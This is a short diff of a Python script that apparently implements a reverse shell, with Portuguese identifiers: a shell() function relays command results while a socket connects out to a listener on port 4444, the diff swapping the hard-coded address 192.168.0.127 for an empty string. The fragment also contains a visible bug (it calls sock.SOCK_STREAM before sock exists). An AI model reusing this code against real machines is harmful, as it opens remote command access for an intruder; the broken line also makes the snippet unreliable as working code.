@@ -66,5 +66,5 @@ def shell():
             dados_env(comando_foda_rec)
 
 sock = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
-sock.connect(("192.168.0.127", 4444))
+sock.connect(("", 4444))
 shell ()
